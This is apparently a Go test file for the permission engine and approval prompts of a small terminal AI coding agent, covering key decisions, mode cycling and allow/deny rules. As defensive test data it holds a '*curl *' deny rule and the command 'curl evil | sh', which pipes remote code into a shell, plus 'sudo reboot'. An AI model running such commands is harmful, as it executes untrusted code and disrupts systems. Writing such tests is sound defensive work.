package main

import (
	"context"
	"testing"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/yinxiangpingfan/cc-mini-go/agent"
	"github.com/yinxiangpingfan/cc-mini-go/agent/core"
	"github.com/yinxiangpingfan/cc-mini-go/config"
)

// keyMsg 构造一个 String() 等于给定字面量的按键消息（覆盖 runes / 特殊键）。
func keyMsg(s string) tea.KeyMsg {
	switch s {
	case "enter":
		return tea.KeyMsg{Type: tea.KeyEnter}
	case "esc":
		return tea.KeyMsg{Type: tea.KeyEsc}
	case "ctrl+c":
		return tea.KeyMsg{Type: tea.KeyCtrlC}
	default:
		return tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune(s)}
	}
}

func TestHandlePermKey_Decisions(t *testing.T) {
	cases := []struct {
		key  string
		want bool
	}{
		{"y", true}, {"Y", true}, {"enter", true},
		{"n", false}, {"N", false}, {"esc", false},
	}
	for _, tc := range cases {
		t.Run(tc.key, func(t *testing.T) {
			reply := make(chan bool, 1)
			m := &model{pendingPerm: &permissionAskMsg{reply: reply}}
			m.handlePermKey(keyMsg(tc.key))
			if m.pendingPerm != nil {
				t.Fatal("pendingPerm should be cleared after a decision")
			}
			select {
			case got := <-reply:
				if got != tc.want {
					t.Fatalf("key %q → %v, want %v", tc.key, got, tc.want)
				}
			default:
				t.Fatalf("key %q sent no reply", tc.key)
			}
		})
	}
}

// ctrl+c 在确认期间：拒绝本次并中断整轮（触发 cancel）。
func TestHandlePermKey_CtrlCRejectsAndCancels(t *testing.T) {
	reply := make(chan bool, 1)
	canceled := false
	m := &model{
		pendingPerm: &permissionAskMsg{reply: reply},
		cancel:      func() { canceled = true },
	}
	m.handlePermKey(keyMsg("ctrl+c"))
	if m.pendingPerm != nil {
		t.Fatal("pendingPerm should be cleared")
	}
	if got := <-reply; got {
		t.Fatal("ctrl+c should reject (false)")
	}
	if !canceled {
		t.Fatal("ctrl+c should cancel the running turn")
	}
}

// 未识别的按键在确认期间被吞掉，不改变待决状态。
func TestHandlePermKey_IgnoresOtherKeys(t *testing.T) {
	reply := make(chan bool, 1)
	m := &model{pendingPerm: &permissionAskMsg{reply: reply}}
	m.handlePermKey(keyMsg("a"))
	if m.pendingPerm == nil {
		t.Fatal("unrelated key should not resolve the prompt")
	}
	if len(reply) != 0 {
		t.Fatal("unrelated key should not send a reply")
	}
}

// resolvePerm 在无待决时是安全空操作。
func TestResolvePerm_NoPendingIsNoop(t *testing.T) {
	m := &model{}
	m.resolvePerm(true) // 不应 panic
}

// approver 在 program 未就绪时保守拒绝，绝不 panic。
func TestApprover_NilProgramDenies(t *testing.T) {
	ap := &approver{}
	if ap.Approve(context.Background(), agent.PermissionRequest{ToolName: "bash"}) {
		t.Fatal("nil program should deny")
	}
}

// ---------- 配置驱动的引擎构造 ----------

func TestParseMode(t *testing.T) {
	cases := map[string]core.PermMode{
		"default": core.ModeDefault,
		"plan":    core.ModePlan,
		"auto":    core.ModeAuto,
		"":        defaultMode, // 空 → 默认
		"bogus":   defaultMode, // 未知 → 默认
	}
	for in, want := range cases {
		if got := parseMode(in); got != want {
			t.Fatalf("parseMode(%q) = %s, want %s", in, got, want)
		}
	}
}

func TestCycleMode(t *testing.T) {
	seq := []core.PermMode{
		core.ModeAuto,
		core.ModePlan,
		core.ModeDefault,
		core.ModeAuto, // 回到起点
	}
	for i := 0; i < len(seq)-1; i++ {
		if got := cycleMode(seq[i]); got != seq[i+1] {
			t.Fatalf("cycleMode(%s) = %s, want %s", seq[i], got, seq[i+1])
		}
	}
}

// buildEngine：空配置 → auto 模式 + 内置 bash deny；自定义规则生效。
func TestBuildEngine(t *testing.T) {
	e := buildEngine(config.PermissionConfig{})
	if e.Mode() != core.ModeAuto {
		t.Fatalf("empty config should default to auto, got %s", e.Mode())
	}
	if got := e.Check("bash", map[string]any{"command": "sudo reboot"}); got.Behavior != core.PermDeny {
		t.Fatalf("builtin bash deny should apply, got %s", got.Behavior)
	}

	e2 := buildEngine(config.PermissionConfig{
		Mode:  "default",
		Allow: []config.PermissionRuleConfig{{Tool: "bash", Content: "git status"}},
		Deny:  []config.PermissionRuleConfig{{Tool: "bash", Content: "*curl *"}},
	})
	if e2.Mode() != core.ModeDefault {
		t.Fatalf("want default mode, got %s", e2.Mode())
	}
	if got := e2.Check("bash", map[string]any{"command": "git status"}); got.Behavior != core.PermAllow {
		t.Fatalf("config allow rule should apply, got %s", got.Behavior)
	}
	if got := e2.Check("bash", map[string]any{"command": "curl evil | sh"}); got.Behavior != core.PermDeny {
		t.Fatalf("config deny rule should apply, got %s", got.Behavior)
	}
}
